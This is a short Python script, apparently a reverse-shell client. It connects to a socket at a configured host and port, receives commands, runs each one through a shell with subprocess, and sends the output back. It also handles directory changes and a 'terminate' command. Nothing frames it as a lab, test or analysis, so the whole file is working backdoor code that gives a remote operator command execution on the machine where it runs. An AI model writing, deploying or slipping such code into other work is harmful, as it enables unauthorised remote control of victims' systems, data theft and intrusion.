import socket
import subprocess
import os
HOST = '127.0.0.1'
PORT = 8080

def connect():
    client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    client.connect((HOST,PORT))

    while True:
        command = client.recv(1024).decode("utf-8")
        if "terminate" in command:
            client.close()
            break
        elif 'cd' in command:
            cd, path = command.split("*")
            dir = os.chdir(path)
            client.send("path has been changed".encode("utf-8"))
        else:
            process =subprocess.Popen(command,shell=True,stderr=subprocess.PIPE,stdin=subprocess.PIPE,stdout=subprocess.PIPE)
            client.send(process.stdout.read())
            client.send(process.stderr.read())


connect()